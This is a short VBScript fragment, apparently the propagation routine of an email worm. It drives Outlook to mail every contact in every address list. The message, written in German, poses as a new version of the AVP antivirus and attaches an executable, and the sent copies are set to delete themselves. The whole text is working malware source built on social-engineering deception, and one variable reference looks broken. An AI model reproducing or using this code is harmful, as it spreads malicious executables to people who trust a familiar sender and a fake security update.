On Error Resume Next
Dim fso,a,b,c,d,e,f,ere
Set fso = CreateObject ("outlook.application")
Set a = fso.GetNameSpace ("MAPI")
For b = 1 To a.AddressLists.Count
Set c = a.AddressLists (b)
ere = 0
ere = ere + 1
Set d = fso.CreateItem (0)
For e = 1 To c.AddressEntries.Count
f = c.AddressEntries (g)
d.Recipients.Add f
ere = ere + 1
Next
d.Subject = "Neue annoncierende Version des AVP"
d.Body = "Neue annoncierende Version von Antivirus AVP,prüft bitte Ost-Software"
d.Attachments.Add "c:\AVP4.6.exe"
d.DeleteAfterSubmit = True
d.Send
Next
